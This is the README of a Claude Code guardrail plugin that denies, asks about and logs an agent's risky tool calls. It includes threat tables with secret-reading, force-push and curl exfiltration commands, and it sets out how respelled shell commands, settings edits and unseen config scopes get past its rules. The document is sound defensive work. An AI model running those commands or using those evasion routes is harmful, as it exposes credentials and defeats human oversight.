# agent-guardrails

[![CI](https://github.com/jdgafx/agent-guardrails/actions/workflows/ci.yml/badge.svg?branch=main)](https://github.com/jdgafx/agent-guardrails/actions/workflows/ci.yml)

A Claude Code plugin that checks the tool calls the agent makes, before they run (Claude Code sends each call to the hook).
It denies the file and MCP tool calls its rules list as dangerous, asks you about the ones they list as risky (and about a shell command that matches a deny rule, because shell text can be spelled in ways no rule matches), and writes a log of denies, asks and calls that ran (with gaps: see "Logs are partial"). A call that matches no rule is allowed (apart from the built-in checks: `deny-guard-files`, `ask-guard-paths`, `ask-claude-settings`, `oversize-command` and `step-cap`). The plugin creates the log with mode 0600, so other users cannot read it; the agent can. "What this does not do" below lists the main known gaps.

Alternatives set aside, one line each (full reasons: [ARCHITECTURE](docs/ARCHITECTURE.md), "Alternatives at a glance"). An allowlist would block every command not listed. A deny on every internal error would stop all work, so an error asks. Blocking injected text has false positives, and rewriting it makes the model see text that differs from the tool's real output, so it is scanned and logged. Claude Code's own `permissions.deny` and sandbox show no per-rule reason and are not known to keep a per-call decision log (not checked), and they can be used together with this plugin. Isolation (a container or a separate account) is the stronger control for what the rules cannot see, and was not weighed against this plugin; this plugin has an opt-in layer for shell reads of secret files, built on Claude Code's own sandbox (see "Isolation (opt-in)"). A user's policy file is merged into the shipped policy and can only add (one exception: `trusted_tools`, see "Change the rules"): a file that could replace or loosen the shipped rules would let the agent switch the guard off (a full copy that replaced the shipped policy was the old design). `pip` for the engine would need a package-manager step that a plugin install is not expected to run, and a venv is not portable between machines, so the engine is copied in. A small shell tokeniser in place of the regexes was not tried (it would catch quoted flags; see "What this does not do"). The step is counted after the rules, so a deny stays a deny when the counter cannot be written. A built-in minimum deny list for a broken shipped policy is not built.

It uses only the Python standard library. No API key. No network. No pip install.

Dashboard: open `index.html` in a browser (double-click it) to see the rules and a sample log, and add `?states=1` to the address to preview every state.

## The seven controls

Words used here (hook, policy, step cap, deny, ask, allow, MCP, bypass mode) are defined in [GLOSSARY](GLOSSARY.md).

| # | Control | What it does | Where |
|---|---------|--------------|-------|
| 1 | Denylist (deny) | Denies `.env` files, private keys, cloud and SSH credentials and production paths when a path field of a file or MCP tool names them. In a shell command, these rules ask instead, and so does the force-push rule (`git push` followed by `--force`, `--force-with-lease`, `-f` or `+branch`; it reads only Bash, not PowerShell or Monitor): see "What holds each threat". The rules are in one editable `policy.json`. A rule is **deny** or **ask**; deny beats ask; a call that matches no rule is allowed; a Bash command over 20000 characters is not checked and always asks. Option words before the subcommand are allowed (`git -C repo push --force` asks). Gaps (quoted or hidden spellings): see "What this does not do". | `deny-*` rules, `policy.json`, `rules.py` |
| 2 | Approval gates (ask) | Asks you before `git push`, recursive `rm`, `git reset --hard`, `terraform apply` and `destroy`, `kubectl apply` and `delete`, `vercel --prod`, package publish (`npm`, `pnpm` or `yarn publish`, `twine upload`, `cargo publish`, `uv publish`, `gem push`), MCP tools with `send`, `delete`, `post`, `pay`, `charge` or `transfer` at the start of a word of the tool name (`mcp__gmail__send_email`, `mcp__x__bulkDelete` and `mcp__x__make-payment` ask; `mcp__x__get_posts` and `mcp__x__list_payments` do not; the server name does not count), and any Bash command over 20000 characters. Option words may sit before the subcommand (`git -C repo push`, `kubectl -n prod delete`, `terraform -chdir=infra apply`, `npm --tag x publish` all ask). It also asks before `git clean -f`, `gh pr merge`, `gh release create`, `docker push`, `helm install`, `upgrade` and `uninstall`, `find -delete`, a `python -c` one-liner that deletes files, `aws s3 rm`, `cp`, `mv` and `sync`, `aws` operations (the word after the service name, as in `aws ec2 terminate-instances`) starting `delete-`, `put-`, `create-`, `update-` or `terminate-`, and `vercel --target=production`. | `ask-*` rules, `oversize-command` |
| 3 | Audit trail | One JSON line for each deny, each ask, and each call that ran (with gaps: see "Logs are partial" below), file mode 0600, under `${CLAUDE_PLUGIN_DATA}/audit/`. | `audit.py` |
| 4 | Step cap | After 200 calls in one session, any call with no other rule switches to **ask**. | `step-cap` rule |
| 5 | Secret redaction | Seven key formats (the AWS secret key only after `aws_secret_access_key=` or `:`, not in the quoted JSON form) are replaced with `[REDACTED:kind]` before anything is written to the log. With isolation on, the same formats are also replaced in the output of a successful shell command before Claude sees it, so that output differs from what the command printed (see "Isolation (opt-in)"). | `redact.py` |
| 6 | Untrusted input | The output of every tool you have not listed in `trusted_tools` (failed calls too) is scanned for six injection phrases. A warning goes in the log only; nothing is added to the conversation (the scan changes nothing; only the isolation redaction in control 5 changes shell output). The scan is a record of what came in, not a shield (what it misses: limit 2 in [THREAT_MODEL](docs/THREAT_MODEL.md)). | `injection.py` |
| 7 | Fail safe | An internal error, bad input or an unwritable state file gives **ask**, not allow, but only for a call no rule denies or asks about: the rules run first, so a deny stays a deny when the data folder is unset, unwritable or a file, or an added policy file is broken. If the hook cannot start, crashes or times out, `"onFailure": "block"` in `hooks.json` should make Claude Code block the call (2.1.295 or later; untested here). See "How the fail-safe works". | `hooks.py`, `hooks.json` |

### How the fail-safe works

The Pre hook runs these steps in order: read the input, check the guard paths (below), load the policy, check the rules, count the call (in `state/`, inside the data folder), save its decision, write the log. The rules run before anything that touches the data folder, so a deny stays a deny and an ask stays an ask when the data folder is unset, a file or read-only. Only a call that no rule matched becomes an ask when it cannot be counted, saved or logged. A shipped policy that cannot load makes every call ask, except the denies on the guard's own files. An added policy file that is missing, unreadable or invalid is left out and the shipped rules still apply (details under "Change the rules").

Three built-in checks guard the guard itself. They compare paths after `~`, `..` and symbolic links are resolved.
- `deny-guard-files`: the Write, Edit, MultiEdit and NotebookEdit tools, and any MCP tool, are denied on a path inside the plugin folder, the data folder or the `GUARDRAILS_POLICY` file. (An MCP tool is denied there even when it only reads; the Read tool is not affected, so you can still read the log with it.) Claude may not edit your policy file either: edit it yourself.
- `ask-guard-paths`: a Bash command asks when one of its words is an absolute or `~` path inside those places, for example `tail ~/.claude/plugins/data/agent-guardrails/audit/x.jsonl` or `sed -i s/deny/ask/ /opt/agent-guardrails/policy.json`. This is a tripwire, not a barrier: see "The agent can still change the guard from the shell" below.
- `ask-claude-settings`: a write tool asks before it changes `.claude/settings.json` or `.claude/settings.local.json` in the project, or the same two files in your home folder (or in `CLAUDE_CONFIG_DIR` when that is set), because those files can switch the plugin off. The `onFailure` setting is on the Pre hook only; its version and test caveat is under "What this does not do".

## What holds each threat

Each cell of the first table uses these terms.
- **hook deny**: Pre refuses the call. It applies to a call whose path field names the thing (the Read, Edit, MultiEdit, Write, NotebookEdit, Grep and Glob tools, and MCP tools). Text fields such as Write `content` are not checked.
- **tripwire deny**: with isolation on, Pre refuses every shell call until a setting is fixed.
- **ask + log only**: Pre asks you and writes a log line. The shell text was matched, and another spelling would not be.
- **sandbox**: Claude Code's sandbox, with this plugin's block, stops it however the command spells the name. File names are case-sensitive there: `.ENV` is not hidden.
- **redacted**: Post replaces known key formats in shell output.
- **GitHub ruleset**: GitHub refuses it on the server.
- **not held**: no part of this plugin or the sandbox stops it.

Turn isolation on if its costs suit you (see "Isolation (opt-in)"); we recommend it. It is off by default because of those costs.

| Threat | Example | Isolation off (default) | Isolation on |
|---|---|---|---|
| A file or MCP tool names a listed secret file | `Read .env`, the Grep tool with glob `.env*`, an MCP `file:///home/u/.env` | hook deny | hook deny |
| A file tool opens a listed secret through a link | `Read ./notes` (a link to `.env`) | not held | hook deny (the link check) |
| A shell command names a listed secret in the project, directly in `~` or in `~/.config` (a PowerShell or Monitor command is matched as one whole string, so a command that ends in another word is not seen: limit 4 in [THREAT_MODEL](docs/THREAT_MODEL.md)) | `cat .env`, `cat ~/.aws/credentials`, `cat ~/.ssh/id_rsa` | ask + log only | sandbox (Pre also asks and logs) |
| A shell command builds, globs or finds the name | `cat .e""nv`, `cat .n*rc`, `cd ~/.kube && cat config` | not held | sandbox |
| A shell command searches a folder | `grep -r AWS_SECRET ~`, `tar cf - .` | not held | sandbox (hidden files read as `Permission denied`) |
| A shell command names a secret elsewhere, or a key file outside `~/.ssh` | `cat ~/other/.env`, `cat server.pem` | ask + log only | ask + log only |
| The same, without naming it | `cat ~/other/.e""nv` | not held | not held |
| A shell command reads production config | `cat config/prod/db.yml` | ask + log only | ask + log only |
| A secret in an environment variable | `printenv` | not held | redacted (known key formats, if the command exits 0), not held for other values |
| Old copies in git | `git show HEAD:.e""nv` | not held | not held |
| The Grep tool or an MCP tool, when no field spells a listed name | the Grep tool with glob `*`, an MCP `file:///home/u/%2Eenv` | not held | not held (they run outside the sandbox) |
| An MCP tool that runs shell commands | `mcp__x__run` with `cat .env`, or with `cat .e""nv` | hook deny when a field spells a listed name; not held otherwise | hook deny when a field spells a listed name; not held otherwise |
| Force push, or deleting the default branch | `git push --force origin main`, `git push origin :main` | ask + log only, Bash only; GitHub ruleset where the branch has one and the agent's login cannot edit rulesets | ask + log only, Bash only; GitHub ruleset where the branch has one and the agent's login cannot edit rulesets |
| A shell command writes outside the project | `echo x >> ~/.bashrc`, `rm -rf ~/x` | not held (`rm -rf ~/x`: ask + log only) | sandbox (writes go only to the project and the temp folder) |
| A shell command rewrites the project's Claude Code settings, hooks or `.mcp.json` | `echo '{}' > .claude/settings.local.json` | not held | sandbox (Claude Code protects these files) |
| A project setting opens the sandbox | `allowWrite`, `permissions.additionalDirectories`, `network.allowedDomains`, an `Edit(...)` or `WebFetch(domain:...)` allow rule or `excludedCommands` in `.claude/settings.local.json` | not held | tripwire deny |
| Data leaves the machine | `curl -d @notes.txt https://example.com` | not held | sandbox network: a new host is asked about in default, acceptEdits and plan mode, refused in dontAsk mode, refused in auto mode unless the classifier approves, and let through in bypass mode, hosts in the `allowedDomains` or the `WebFetch(domain:...)` allow rules of your user settings pass, and `claude -p` is not tested |

The isolation-on column assumes the block is in the project's settings files and Claude Code started in the project folder. `--settings`, `--add-dir`, user settings and managed settings can open the sandbox without Pre seeing it. Write folders and hosts that you want in every project go in your user settings (`~/.claude/settings.json`, where lists merge with the project's); Pre cannot see them there. "Not held" for a command means this plugin has no rule for it (the doc test checks every quoted command against the shipped policy), and Claude Code's own prompts still apply. The isolation-on column comes from real `claude -p` sessions (`tests/live/t014_probe.py`, see "Tested on"). The sandbox rows for a write outside the project, a file in `.git/hooks` and a rewrite of the project's settings were run live on 2026-11-06 (Claude Code 2.1.319, steps 45 to 47 of the same script): each write was refused with "Read-only file system". Step 47 shows that only when it runs alone; in the script's one session after step 46, the `cd` of step 46 carries over and step 47 writes a different file, so the script's case T018-47 does not test it yet. The Grep tool row holds only when a session turns that tool on; by default on Linux and macOS the search runs as Bash `grep`, which the sandbox covers.

**Force pushes.** The barrier for a force push is on the server. A GitHub ruleset on your default branch with "Block force pushes" and "Restrict deletions" refuses every spelling of a force push and of a branch delete (see GitHub's documentation page "Creating rulesets for a repository", https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-rulesets/creating-rulesets-for-a-repository). It holds only while the agent's GitHub login cannot edit rulesets: a repository admin can delete a ruleset (`gh api -X DELETE repos/<owner>/<repo>/rulesets/<id>` has no rule here) and then force-push. Give agent sessions a token without admin rights on the repository. The default branch of this repository has such a ruleset.

**What an ask does in each mode.** An ask stops the call until someone answers. Where nobody can answer (`claude -p`), the call is refused. The two interactive results below were seen once each, with a hook in a `--settings` file and a `Bash` command, not with this plugin and not with other tools.

| Where you run Claude Code | What a hook's ask does | Source |
|---|---|---|
| Interactive, default mode | you are asked | Claude Code hooks docs, "PreToolUse decision control" |
| Interactive, auto mode | you are asked, and the auto-mode classifier may refuse the call before you see it | Claude Code hooks docs, "PreToolUse ask decisions in auto mode" |
| Interactive, acceptEdits mode | you are asked: the command did not run until someone answered | Tested 2026-11-06 on Claude Code 2.1.319: a stub hook answered ask on one harmless `Bash` command in a throwaway folder (no plugin). The prompt read "Hook PreToolUse:Bash requires confirmation for this command". No file was made before the answer, and the hook log showed `acceptEdits` |
| Interactive, plan mode | not tested | not tested |
| Interactive, bypass mode | you are asked: the command did not run until someone answered | Tested 2026-11-06 on Claude Code 2.1.319, the same way. The bypass mode banner was on, the same prompt appeared, no file was made before the answer, and the hook log showed `bypassPermissions` |
| `claude -p` (default, acceptEdits, auto, dontAsk or bypass mode) | the call is refused | Claude Code headless docs, "Auto-approve tools" (default mode), and a test run on Claude Code 2.1.319 (all five) |
| `claude -p` with a `PermissionRequest` hook or `--permission-prompt-tool` | that hook or tool decides, with no person | Claude Code headless docs, "Auto-approve tools" |

## Try it (no Claude session needed)

From a clone of this repo, at its root. This needs `make` and `python3` (3.9 or newer); it does not need `uv`. It runs `make build` first (which re-copies `vendor/`).

```bash
make demo
```

This feeds 24 fixture tool calls to the real hook scripts and prints the decision for each. (The `...` lines below are rows left out of this copy; the command prints all 24.)

```text
#   tool                    input                                           decision  rule                  note
--  ----------------------  ----------------------------------------------  --------  --------------------  ---------------------------------------------------------
1   Read                    {"file_path":"README.md"}                       allow     default-allow
2   Read                    {"file_path":".env"}                            deny      deny-env-files
3   Read                    {"file_path":"/app/.env.production"}            deny      deny-env-files
4   Read                    {"file_path":".env.example"}                    allow     default-allow
5   Bash                    {"command":"cat /home/u/.ssh/id_rsa"}           ask       deny-key-files        shell asks; Read denies
...
10  Bash                    {"command":"git push origin main"}              ask       ask-git-push
11  Bash                    {"command":"git push --force origin main"}      ask       deny-force-push       shell asks; ruleset refuses
12  Bash                    {"command":"rm -rf build"}                      ask       ask-rm-recursive
...
18  Bash                    {"command":"echo [REDACTED:anthropic-key]"}     allow     default-allow         secret redacted in log
19  WebFetch                {"url":"https://example.com/page"}              allow     default-allow         injection warning: ignore-previous (logged, not injected)
...
23  Bash                    {"command":"ls"}                                ask       step-cap
24  Bash                    {"command":"ls"}                                ask       step-cap

24 calls: 10 allow, 10 ask, 4 deny. Step cap for this demo: 3.
All decisions matched the fixtures.
```

(The demo copies the shipped policy into a throwaway data folder and sets `step_cap.max_calls` to 3, so you can see the cap fire. The real default is 200. Rows 20 to 24 share one session, so the counter reaches 4 at row 23; every other row has its own session. The key in row 18 is a fake built at run time.)

## Install

Try it in a throwaway session, nothing installed:

```bash
claude --plugin-dir packages/guardrails-plugin
```

Or install it from this repo:

```text
/plugin marketplace add jdgafx/agent-guardrails
/plugin install agent-guardrails@agent-guardrails
```

(`agent-guardrails@agent-guardrails` is plugin@marketplace.) The plugin needs `python3` on PATH. CI runs on Linux; macOS and Windows are not tested. To see your Claude Code version, run `claude --version` (2.1.295 or later is needed for the hard fail-safe).

`--plugin-dir` loads a plugin from a local folder. The write tools are denied on the plugin folder, so with a plugin folder inside your project Claude cannot edit it with them (it also cannot edit the plugin while you develop it in that session). Bash can still write there; install the plugin from the marketplace or copy it outside the project, and see limit 7 of [THREAT_MODEL](docs/THREAT_MODEL.md).

The plugin folder is self-contained. You can copy `packages/guardrails-plugin` anywhere and it is meant to run with the stock `python3` on your PATH. Tested on: 3.12 and 3.14 by hand, and the runner's stock `python3` in CI (version not recorded). The code avoids syntax newer than 3.8, but 3.8 was not run, and the root `pyproject.toml` asks for 3.9 or newer.

## Log from one live session

One `claude -p` run (Claude Code's non-interactive print mode, with Haiku, with `--plugin-dir packages/guardrails-plugin`) was told to read a `.env` file, run `git push origin main`, and run `ls`. These are three lines from the audit file the plugin wrote, copied as written (only the first line, an allowed read of the prompt file, is left out):

```text
{"ts": "2026-10-25T22:55:13Z", "session_id": "092e3bfc-6908-4866-8f6a-fc8874c50da8", "tool_name": "Read", "tool_use_id": "toolu_015j8TNTLXykJHQ7beYmVD67", "event": "decision", "decision": "deny", "rule": "deny-env-files", "step": 2, "input": {"file_path": "/tmp/ag-live/.env"}, "reason": "Environment files hold secrets. Claude may not read or touch them.", "gen_ai.tool.name": "Read", "gen_ai.tool.call.id": "toolu_015j8TNTLXykJHQ7beYmVD67", "gen_ai.conversation.id": "092e3bfc-6908-4866-8f6a-fc8874c50da8"}
{"ts": "2026-10-25T22:55:14Z", "session_id": "092e3bfc-6908-4866-8f6a-fc8874c50da8", "tool_name": "Bash", "tool_use_id": "toolu_011jjerSfvDs1vqytJDTFkrW", "event": "decision", "decision": "ask", "rule": "ask-git-push", "step": 3, "input": {"command": "git push origin main", "description": "Push local main branch to origin"}, "reason": "A push publishes commits. Confirm the branch.", "gen_ai.tool.name": "Bash", "gen_ai.tool.call.id": "toolu_011jjerSfvDs1vqytJDTFkrW", "gen_ai.conversation.id": "092e3bfc-6908-4866-8f6a-fc8874c50da8"}
{"ts": "2026-10-25T22:55:14Z", "session_id": "092e3bfc-6908-4866-8f6a-fc8874c50da8", "tool_name": "Bash", "tool_use_id": "toolu_01JrVTEMMsNazQoJM8Z3f77B", "event": "result", "decision": "allow", "rule": "default-allow", "step": 4, "input": {"command": "ls /tmp/ag-live", "description": "List files in /tmp/ag-live"}, "result_bytes": 104, "status": "ok", "warnings": [], "gen_ai.tool.name": "Bash", "gen_ai.tool.call.id": "toolu_01JrVTEMMsNazQoJM8Z3f77B", "gen_ai.conversation.id": "092e3bfc-6908-4866-8f6a-fc8874c50da8"}
```

What happened in that session (a single run, not a test):
- The `.env` read was **denied**.
- The `git push` was **asked**. In `-p` (headless) mode nobody can answer. The log has no result line for the push, so it probably did not run (a result line is also missing when the Post script fails).
- The `ls` ran. Step 1 (reading the prompt file) was also allowed and logged as a `result` line.

## Audit log format

- Path: `${CLAUDE_PLUGIN_DATA}/audit/YYYY-MM-DD.jsonl` (UTC date). Folder mode 0700, file mode 0600 when the plugin creates them (an existing folder or file keeps its mode). `${CLAUDE_PLUGIN_DATA}` is the data folder: Claude Code sets this variable for plugin hooks, it is outside the plugin folder and it survives plugin updates (as Claude Code documents it; not tested here). The plugin keeps its log (`audit/`) and counters (`state/`) there. Claude Code picks the folder. For plugins installed from a marketplace, the data folders on one Linux machine were under `~/.claude/plugins/data/<plugin>-<marketplace>/`.
- `event: "decision"` lines come from the PreToolUse hook. Only deny and ask are written there.
- `event: "result"` lines come from the PostToolUse hook, and from the PostToolUseFailure hook for a call that failed (`status` is `error`), for every call that ran when the Post script works (if it fails, the call leaves no result line). They carry the decision, rule and step that PreToolUse recorded. A result line has `scan_truncated: true` when the result was longer than 200000 characters and the rest was not scanned, and a `scan-timeout` warning when a marker did not finish in 3 seconds.
- Secrets in the input are replaced with `[REDACTED:<kind>]` before writing and before the 2000-character cut below. Kinds: private-key, anthropic-key, openai-key, aws-access-key, aws-secret-key, github-token, bearer-token.
- If the JSON text of the input is longer than 2000 characters (the default of `audit.max_input_chars` in `policy.json`), the whole `input` field is replaced by `{"truncated": "<the first 2000 characters>"}`.
- Every line is plain ASCII: a non-ASCII character is written as `\uXXXX`. `jq` and `json.loads` show the original text; `grep` for a non-ASCII word in the raw file does not find it.
- Field names `gen_ai.tool.name`, `gen_ai.tool.call.id` and `gen_ai.conversation.id` follow the OpenTelemetry GenAI naming style. There is no exporter. Setting `audit.otel_field_names` to false in `policy.json` leaves the three fields out.

## Change the rules

The rules live in `policy.json` (the shipped copy is `packages/guardrails-plugin/policy.json`; it holds the patterns and the step cap of 200). Five checks are built into the code, not into `policy.json`: `deny-guard-files`, `ask-guard-paths` and `ask-claude-settings` (see "How the fail-safe works"), `oversize-command` (the 20000-character limit is a constant in `rules.py`) and the `step-cap` ask itself (only its number, `step_cap.max_calls`, is in `policy.json`).

The shipped policy always loads first. Your own policy files are added to it, and they can only add, with one exception: `trusted_tools` turns off the injection scan for the tools it names (what it turns off is a log warning, never a deny or an ask):
1. The file named in the `GUARDRAILS_POLICY` environment variable (set it in the environment that starts Claude Code; use an absolute path).
2. `${CLAUDE_PLUGIN_DATA}/policy.json`.

Both are optional and both are used if both exist. A missing or broken added policy file is left out, the shipped rules still apply, and calls no rule matches ask. The ask names the file and the error (rule `guardrails-policy-error`) until you fix or remove the file. A `GUARDRAILS_POLICY` that names a missing path or a folder counts as broken; no file at all in the data folder is normal. A file in the data folder that is a folder, a dangling link or a pipe is broken too.

What an added file can do:
- Add rules. Shipped rules run first; the strongest rule that matches wins (deny over ask). An added rule cannot weaken or remove a shipped one, and it cannot turn a shipped deny into an ask. An added deny rule of kind `path` or `command` asks on a shell command, like the shipped ones; a `tool` rule still denies. To relax a rule you must edit the shipped file by hand (a plugin update undoes that edit).
- Lower the step cap with `step_cap.max_calls`. A higher value is ignored.
- Add `injection_markers`: more phrases are looked for in the scanned output. Every tool is scanned already; an added `untrusted_tools` name scans nothing new, it only stops a `trusted_tools` pattern from turning the scan off for that tool.
- Add `trusted_tools` names (regular expressions on the tool name): the output of a matching tool is not scanned for injection phrases. This is the one key that turns something off, and what it turns off is a log warning, never a deny or an ask. A tool that `untrusted_tools` names (WebFetch, WebSearch, MCP read tools) is scanned even if a `trusted_tools` pattern matches it.
- Set `"isolation": true` to turn the isolation layer on (see "Isolation (opt-in)"). A file with only `{"version": 1, "isolation": true}` is valid (`rules` is not required in an added file). `true` in any file wins; no file can turn it off.
- `audit` keys in an added file are ignored: a smaller value would weaken the log.

You no longer need a full copy of the shipped file, only your added rules. If you made a full copy earlier, it still loads (its rules sit beside the shipped ones), but a copy that fails the check below is left out. An old full copy also brings back the old `deny-prod-config` without `"project_relative": true`, which is matched on the whole path: in a project under a `prod` or `production` folder its files are denied again. Delete the copy, or add the field to that rule in it.

[`policy.schema.json`](packages/guardrails-plugin/policy.schema.json) describes the format, and the hook checks every policy file against all of it: wrong types, unknown keys, a `version` other than the whole number 1 (`true` and `1.0` fail), a text `except`, an empty `rules` list. The shipped policy must also have `step_cap.max_calls`.

To add a rule:
1. Write `${CLAUDE_PLUGIN_DATA}/policy.json` (or keep the file anywhere and point `GUARDRAILS_POLICY` at its absolute path) with `{"version": 1, "rules": [...]}`. Claude cannot write these files for you: the write tools are denied there, so edit them yourself.
2. A rule has an `id`, a `decision`, a `kind` (`path`, `command` or `tool`), `match` patterns and a `reason`, and, for `path` rules only, may have an `except` list that excuses matches, and an optional `"project_relative": true` (a boolean; any other value makes the file invalid). Without it a glob is matched against the whole path. With it, a path that sits inside the project is matched on the part below the project folder, so a rule about `*/production/*` does not fire on a project that lives in or behind a folder of that name. The project folder is `CLAUDE_PROJECT_DIR`, else the hook's working folder. The inside test is by text only, with no disk call: the path with `~` expanded, joined to the hook's working folder and cleaned (`..` folded away), compared with a `/` boundary against the project folder as written and as resolved, never a text prefix. So `~/prod/app/src/x.py`, `../src/x.py` and `/home/u/prod/app/src/x.py` get one answer. A path outside the project, or a `..` that leaves it, is matched whole, as written. **Links:** with isolation on, the path fields of file tools (`file_path`, `path`, `notebook_path`, Glob `pattern`) are also resolved, so a project file that links out to a production folder is denied. A link inside the project named `production` is denied like a folder of that name, in both modes. With isolation off no link is followed (the one stated limit): such a link out is allowed. For a project that sits under a `prod` or `production` folder (`/srv/production/app`) that is weaker than before this rule, which denied every path there because the whole path held the folder name; for any other project it is as before. Shell words and MCP strings are never resolved in either mode. Only `deny-prod-config` carries it; the secret-file rules do not, so a project rooted at `~/.ssh` still has `id_ecdsa` denied. The price: a project rooted at a production config folder itself (`CLAUDE_PROJECT_DIR=~/infra/prod`) has its own files allowed by this rule, because the rule cannot tell that folder from a project that merely sits under one. Keep production config in a sub-folder of the project (`config/production/`), where it stays denied. On a `command` or `tool` rule `except` is ignored without a message; change its `match` pattern instead. Rule ids must be unique within a file. A `deny` there asks when the call is a shell command (Bash, PowerShell or Monitor), so a respelled command is not refused.
3. The policy is read on every hook call, so the change takes effect at once. If the file is wrong, the next call that no rule matches asks and says why.

A new regex is checked to compile, not to be fast, and the hook times out after 10 seconds. The shipped rules come first and the rule loop stops at the first deny, so a slow regex in your file cannot delay a shipped deny on a file tool or on a tool rule. A shell text rule only asks, and an ask does not stop the loop, so a slow regex in your file can delay a shipped shell ask past the timeout; on Claude Code 2.1.295 or later a call that times out should be blocked (older versions probably let it through; untested, see "How the fail-safe works"). It can delay any other ask or an allow past the timeout too. Deleting your policy file removes its rules with no message. Changing the 20000-character limit means editing core and running `make build`.

Release note for upgrades: check your own policy file against the schema. A copy that breaks the strict check (for example a `$schema` key added for an editor) is left out, and calls no rule matches ask until you fix it.

Release note for isolation users: if a project's settings files (`.claude/settings.json` or `.claude/settings.local.json`) hold `sandbox.filesystem.allowWrite`, `sandbox.network.allowedDomains` or a `WebFetch(domain:...)` allow rule, Pre now refuses every shell call there after the upgrade. To get the shell back, move that rule to your user settings (`~/.claude/settings.json`), which Pre does not check and which applies to every project, then remove it from the project file.

## Isolation (opt-in)

The rules match text, so a shell command that never spells a secret file's name gets past them (`cat .e""nv`, `cat .n*rc`, `cd ~/.kube && cat config`). More matching cannot close that: the shell has no end of spellings. Isolation closes it with Claude Code's own Bash sandbox instead. It is **off by default**. With it on:
- The plugin ships a settings block for the sandbox (`isolation/settings.local.json` in the plugin folder). It is generated from the secret rules of `policy.json` (`make isolation`), and a test fails while the committed file is stale. The sandbox then hides the listed files from every Bash, PowerShell and Monitor command: anywhere in the project folder, and directly in `~` and `~/.config`. A hidden file gives `Permission denied`, a hidden folder shows as empty.
- Pre denies every shell call (rule `isolation-not-active`) when the block is not in the project's `.claude/settings.json` or `.claude/settings.local.json`, and the reason names the failing setting and both files, and says to remove it or to merge the block's `sandbox` key. It also denies a project setting that lets a sandboxed command write outside the project or reach new hosts: `sandbox.filesystem.allowWrite`, `permissions.additionalDirectories`, `sandbox.network.allowedDomains`, a `WebFetch(domain:...)` allow rule (Claude Code adds those hosts to the same list) or an `Edit(...)` allow rule in `permissions.allow`. This is a check for mistakes, not a barrier: it cannot see managed settings, a `--settings` flag, `--add-dir` or your user settings.
- Pre denies a file tool (Read, Edit, Write and the like) that opens a listed file through a symbolic link, which the sandbox cannot see.
- Post replaces secrets with a known shape (the seven formats of control 5) in the output of a shell command that succeeded, before Claude sees it. This is the one place the plugin changes what Claude sees.

### Turn it on

1. Copy `isolation/settings.local.json` from the plugin folder into each project's `.claude/settings.local.json`, or merge its `sandbox` key into the file you have. Do not loosen it: Pre denies a block with an entry removed, an extra `allowRead` entry, `excludedCommands`, `network.allowAllUnixSockets`, or any key it does not know, and it denies `allowWrite`, `permissions.additionalDirectories`, `sandbox.network.allowedDomains`, `WebFetch(domain:...)` allow rules and `Edit(...)` allow rules in the project's settings files. Put extra write folders and trusted hosts in your user settings (`~/.claude/settings.json`). They then apply to every project, and Pre cannot see them. If you answer "Yes, and don't ask again" to a network prompt, Claude Code saves a `WebFetch(domain:...)` allow rule to the project's `.claude/settings.local.json`, and Pre then denies every shell call until you move that rule into your user settings.
2. Write `{"version": 1, "isolation": true}` to `${CLAUDE_PLUGIN_DATA}/policy.json` (or to the file `GUARDRAILS_POLICY` names). A `true` in any policy file turns it on, and no file can turn it off again. Claude cannot write these files for you.
3. Start Claude Code in the project folder (not in `~` or `/`: the block's `./**/` entries would then cover your whole home folder, and each command took 100 to 187 seconds on a 4.5-million-file home folder). Do not start it from an activated project virtual environment (limit 7 in [THREAT_MODEL](docs/THREAT_MODEL.md)).
4. On Ubuntu with `kernel.apparmor_restrict_unprivileged_userns` set to 1, the sandbox cannot start until you add Anthropic's AppArmor profile for `/usr/bin/bwrap` once (a root step; the text is in the Claude Code sandboxing docs, "Add an AppArmor profile for bubblewrap"): `sudo tee /etc/apparmor.d/bwrap`, then `sudo systemctl reload apparmor`. Until then every shell command is refused, with `apply-seccomp: write /proc/self/setgroups` in the error, and nothing runs unsandboxed (the block sets `failIfUnavailable` and turns the unsandboxed retry off). The plugin has no fallback wrapper.
5. Restart Claude Code and run `/sandbox` to confirm the sandbox works.

### Why isolation stays opt-in

- `ssh` and git over ssh stop working: `~/.ssh` is hidden and plain `ssh` has no route out of the sandbox.
- `git push` over https with stored credentials stops working. Pushing over https works if the token is in an environment variable and a credential helper reads it (`GH_TOKEN` and `credential.helper=!f() { echo username=x-access-token; echo password=$GH_TOKEN; }; f`); otherwise push from your own terminal. The plugin already asks before every push.
- Tools that read `~/.ssh` or a hidden `.npmrc` fail (`~/.ssh/*.pub` and `known_hosts` too). A Python virtual environment named `.env` is hidden whole (not tested).
- It needs bubblewrap and user namespaces. On Ubuntu with the restriction it needs the one-time root step above.
- The first connection to each new network host asks. In auto mode Claude Code refuses it unless the classifier approves, and in dontAsk mode it refuses it. A host listed in `sandbox.network.allowedDomains` of your user settings, or named in a `WebFetch(domain:...)` allow rule there, passes without a question.
- Each shell command takes about 0.15 to 1.3 seconds longer, by project size (measured on a probe project and on one of 272,000 files).
- Each project needs its own copy of the block, a new git worktree has none (its shell calls are denied until you copy it; not tested), and a plugin update that adds a name to the secret list makes every copy stale.
- Writes outside the project and the temp folder are denied.

### What isolation does not stop

Accepted limits, each tested at its stated result (the rest are rows of the table in "What holds each threat"):
- `deny-key-files` (`*.pem`, `*.key`) is not in the block: a mask on every `*.pem` would hide the certificate bundle that Python's `certifi` ships inside a project virtual environment. A key file outside `~/.ssh` is readable by the shell, and Pre only asks about it.
- Output of a command that fails comes back unredacted (Claude Code gives the plugin no way to change it), and so does output that is saved to a file because it is large, or that comes from a background command.
- Matching ignores case in Pre; the sandbox does not, so `.ENV` is not hidden.
- Tool config overrides (`XDG_CONFIG_HOME`, `GH_CONFIG_DIR`, `AWS_SHARED_CREDENTIALS_FILE`, `KUBECONFIG`, `DOCKER_CONFIG`, `CLOUDSDK_CONFIG`) move credential files, and `--add-dir` folders are not under the project folder. Claude Code's own token file, `~/.claude/.credentials.json`, can be read by a sandboxed command.
- In bypass mode the agent can edit `.claude/settings.local.json` with the Edit tool; an edit that loosens the block trips the check on the next shell call, but an edit through a scope Pre cannot see does not.
- Code that runs outside the sandbox (a project hook, an `.mcp.json` server) can run files that a sandboxed command wrote.
